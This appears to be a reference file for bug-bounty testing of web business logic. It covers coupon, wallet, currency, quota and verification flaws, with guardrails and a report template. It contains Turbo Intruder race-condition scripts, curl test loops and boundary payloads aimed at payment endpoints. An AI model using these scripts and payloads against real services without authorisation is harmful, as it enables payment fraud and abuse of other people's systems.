# Business Logic — Deep Workflows

Companion to SKILL.md: full attack matrices per flow class, Turbo Intruder
scripts, and evidence techniques.

## Matrix: logic bug classes and where to look

| Class | Typical endpoints | Test ideas |
|---|---|---|
| Price manipulation | cart add/update, order create | negative qty/price, 0-amount pay, currency swap, exponent floats, huge ints |
| Coupon/promo | /coupons/redeem, apply | race, stack coupons via parallel carts, case variants SAVE10/save10, whitespace padding " SAVE10" |
| Wallet/payout | transfer, withdraw, refund | withdraw+transfer race, self-transfer loops, refund before delivery, decimal precision (0.005 rounding) |
| Quota/limits | votes, downloads, invites | idempotency-key reuse, concurrent requests, limit reset timing abuse |
| Workflow state | checkout steps, KYC stages | direct access to final step, replay earlier step after completion, out-of-order API calls |
| Verification | email/phone verify, OTP | cross-account code use, code reuse, brute-force without lockout, response leaks |
| Subscription | upgrade/downgrade/proration | downgrade then immediate refund of prorated period; trial re-roll via email alias |
| Referral/fraud controls | signup bonus | same card/device across normalized emails; delay bonus payout detection |

## Turbo Intruder scripts

### Race a single endpoint (last-byte sync)

```python
# turbo_intruder_race.py - Burp Suite Pro extension script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    req = '''POST /api/coupons/redeem HTTP/1.1
Host: target.example.com
Cookie: session=YOUR_SESSION
Content-Type: application/json
Content-Length: 33

{"code":"SAVE10","cart_id":987}'''
    # last-byte synchronization: open all connections first
    for i in range(30):
        engine.queue(req, gate='race1')
    for i in range(30):
        engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Session-aware racing (unique tokens per request not needed for same-session races)

For endpoints requiring fresh CSRF tokens per request, pre-fetch token N
times, store list, inject via placeholder replacement:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20)
    import json
    tokens = fetch_tokens(20)   # your helper hitting /csrf-token
    for t in tokens:
        r = base_request.replace('__CSRF__', t)
        engine.queue(r, gate='g')
    engine.openGate('g')
```

## Evidence technique for races

Tabulate all responses to prove multiple successes:

```text
Req#  Status  Response excerpt              Server-side effect
1     200     {"applied":true,"total":90}   discount row inserted
2     200     {"applied":true,"total":80}   second discount applied
...
30    200     {"applied":true,"total":-10}  negative total -> wallet credit
```

Capture server timestamps if returned; note DB write latency window.

## Deep test recipes

### Currency confusion
```bash
# Original: {"amount":"100","currency":"USD"}
for cur in USD usd Usd IDR JPY VND ZERO ""; do
  curl -s -X POST $API/pay -H "Authorization: Bearer $T" \
    -d "{\"amount\":\"100\",\"currency\":\"$cur\"}" | jq .
done
```

### Decimal precision
Try: `0.005`, `0.0000001`, `1e-4`, `NaN`, `Infinity`, `-Infinity`, strings
with trailing zeros `"10.00000000001"`. Watch which side rounds and whether
charge < credited value.

### Integer boundaries on quantity
`2147483647, 2147483648, -2147483648, 4294967296` — observe wrap or clamp.
A wrapped negative total that still passes validation = high severity.

### Idempotency-key reuse
```bash
K=$(uuidgen)
curl -X POST $API/orders -H "Idempotency-Key: $K" ... # order created
curl -X POST $API/refunds -H "Idempotency-Key: $K" ...# reused key accepted?
```
If the SAME key is honored across different operations, state machines can
be desynchronized.

### Trial/free-tier re-roll (use only accounts you own)
Same payment instrument + `user+alias@domain`, `us.er@domain`,
`user@sub.domain` normalization differences; device-id reset. Report only if
financial impact is material per program policy.

## Safe-testing guardrails

1. Money mutations ONLY on accounts you own, ideally sandbox/test mode.
2. Cap concurrent connections (<=50) and single burst duration (<2s) —
   avoid DoS territory per program rules.
3. Document every balance/order change you caused; revert when possible.
4. Never automate against third-party real users' data.

## Report narrative structure

1. One-sentence impact ("single-use coupon redeemable unlimited times")
2. Invariant broken + why it matters financially
3. Minimal repro with exact request/response pairs
4. Race timing proof table
5. Realistic abuse scenario (bounded, honest — no fabricated profit claims)
6. Remediation: atomic DB ops (SELECT ... FOR UPDATE), unique constraint on
   redemption rows, idempotency keys, server-side price resolution
